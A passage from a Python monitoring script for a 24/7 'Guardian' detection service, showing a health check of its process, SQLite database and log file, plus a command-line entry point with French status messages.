                except (OSError, subprocess.TimeoutExpired):
                    alive = False
                if alive:
                    print(f"     [OK] PID {pid_int} - actif")
                else:
                    print(f"     [DEAD] PID {pid_int} - introuvable")
                    issues.append("Process mort")
                    healthy = False
            else:
                print(f"     [FAIL] PID invalide: {pid}")
                issues.append("PID invalide")
                healthy = False
        else:
            print("     [WARN] Aucun PID (pas de processus enregistre)")
            issues.append("Pas de PID")

        # 2. Check database
        print("\n  [2/3] Base de donnees...")
        if os.path.exists(db_file):
            size_kb = os.path.getsize(db_file) / 1024
            mtime = datetime.fromtimestamp(os.path.getmtime(db_file))
            age_mins = (datetime.now() - mtime).total_seconds() / 60
            print(f"     [OK] DB: {size_kb:.0f} KB, derniere modif: {mtime:%H:%M:%S} ({age_mins:.0f} min)")
            if age_mins > 5:
                print(f"     [WARN] DB pas modifiee depuis {age_mins:.0f} min")
            if age_mins > 15:
                issues.append(f"DB inactive ({age_mins:.0f} min)")
                healthy = False
            # Check for recent entries
            try:
                conn = sqlite3.connect(db_file)
                cur = conn.execute("SELECT MAX(timestamp) FROM scan_log")
                last_log = cur.fetchone()[0]
                if last_log:
                    last_time = datetime.fromisoformat(last_log)
                    log_age = (datetime.utcnow() - last_time).total_seconds() / 60
                    cnt = conn.execute("SELECT COUNT(*) FROM contracts").fetchone()[0]
                    print(f"     [OK] {cnt} contrats, dernier log: {last_time:%H:%M:%S} ({log_age:.0f} min)")
                conn.close()
            except Exception as e:
                print(f"     [WARN] Erreur lecture DB: {e}")
        else:
            print(f"     [WARN] DB introuvable")
            issues.append("DB absente")

        # 3. Check log file
        print("\n  [3/3] Logs...")
        if os.path.exists(log_file):
            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
            age_mins = (datetime.now() - mtime).total_seconds() / 60
            size_kb = os.path.getsize(log_file) / 1024
            print(f"     [OK] Log: {size_kb:.0f} KB, derniere ecriture: {mtime:%H:%M:%S} ({age_mins:.0f} min)")
            if age_mins > 5:
                print(f"     [WARN] Pas d'ecriture depuis {age_mins:.0f} min")
                if age_mins > 15:
                    issues.append(f"Log inactif ({age_mins:.0f} min)")
                    healthy = False
        else:
            print("     [WARN] Log introuvable")

        print(f"\n{'='*60}")
        if healthy:
            print("  [OK] GUARDIAN: HEALTHY")
        else:
            print(f"  [FAIL] GUARDIAN: ISSUES ({len(issues)})")
            for i, issue in enumerate(issues, 1):
                print(f"     {i}. {issue}")
        print(f"{'='*60}\n")

        return 0 if healthy else 1


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

async def main_async(args):
    if args.health:
        sys.exit(Guardian.check_health())

    guardian = Guardian(config_path=args.config)

    if args.status:
        guardian.print_status()
        return
    if args.report:
        guardian.print_report()
        return

    try:
        await guardian.start()
    except KeyboardInterrupt:
        await guardian.stop()


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Guardian — Usine de detection automatisee 24/7"
    )
    parser.add_argument("--config", "-c", default="config.yaml", help="Config file")
    parser.add_argument("--status", action="store_true", help="Show database status")
    parser.add_argument("--report", action="store_true", help="Export report")
    parser.add_argument("--health", action="store_true",
                        help="Health check (process, DB, logs)")
    args = parser.parse_args()

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
